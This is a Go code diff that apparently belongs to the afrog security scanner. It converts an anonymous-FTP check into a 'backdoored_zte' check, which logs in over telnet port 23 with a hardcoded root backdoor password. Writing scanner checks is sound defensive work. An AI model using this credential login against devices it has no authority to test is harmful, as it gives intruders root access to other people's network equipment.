@@ -1,7 +1,6 @@
 package gox
 
 import (
-	"bytes"
 	"fmt"
 
 	"github.com/zan8in/afrog/pkg/protocols/netxclient"
@@ -10,7 +9,7 @@ import (
 	urlutil "github.com/zan8in/pins/url"
 )
 
-func ftp_anonymous(target string, variableMap map[string]any) error {
+func backdoored_zte(target string, variableMap map[string]any) error {
 	var err error
 
 	variableMap["request"] = nil
@@ -20,16 +19,16 @@ func ftp_anonymous(target string, variableMap map[string]any) error {
 	if err != nil {
 		return err
 	}
-	host := fmt.Sprintf("%s:%s", hostname, "21")
+	host := fmt.Sprintf("%s:%s", hostname, "23")
 
-	data, err := ftp_login(host, variableMap)
+	data, err := telnet_login(host, variableMap)
 	if err != nil {
 		host2, err := urlutil.Host(target)
 		if err != nil {
 			return err
 		}
 
-		data2, err := ftp_login(host2, variableMap)
+		data2, err := telnet_login(host2, variableMap)
 		if err != nil {
 			return err
 		}
@@ -49,7 +48,7 @@ func ftp_anonymous(target string, variableMap map[string]any) error {
 	return nil
 }
 
-func ftp_login(host string, variableMap map[string]any) (string, error) {
+func telnet_login(host string, variableMap map[string]any) (string, error) {
 	nc, err := netxclient.NewNetClient(host, netxclient.Config{})
 	if err != nil {
 		return "", err
@@ -61,7 +60,7 @@ func ftp_login(host string, variableMap map[string]any) (string, error) {
 	}
 	defer client.Close()
 
-	err = client.Send([]byte("USER anonymous\r\n"))
+	err = client.Send([]byte("root\r\n"))
 	if err != nil {
 		return "", err
 	}
@@ -71,7 +70,7 @@ func ftp_login(host string, variableMap map[string]any) (string, error) {
 		return "", err
 	}
 
-	err = client.Send([]byte("PASS anonymous\r\n"))
+	err = client.Send([]byte("Zte521\r\n\r\n"))
 	if err != nil {
 		return "", err
 	}
@@ -81,23 +80,9 @@ func ftp_login(host string, variableMap map[string]any) (string, error) {
 		return "", err
 	}
 
-	if bytes.Contains(data, []byte("331")) {
-		err = client.Send([]byte("PASS anonymous\r\n"))
-		if err != nil {
-			return "", err
-		}
-
-		data, err = client.Receive()
-		if err != nil {
-			return "", err
-		}
-
-		return string(data), nil
-	}
-
 	return string(data), nil
 }
 
 func init() {
-	funcMap["ftp_anonymous"] = ftp_anonymous
+	funcMap["backdoored_zte"] = backdoored_zte
 }
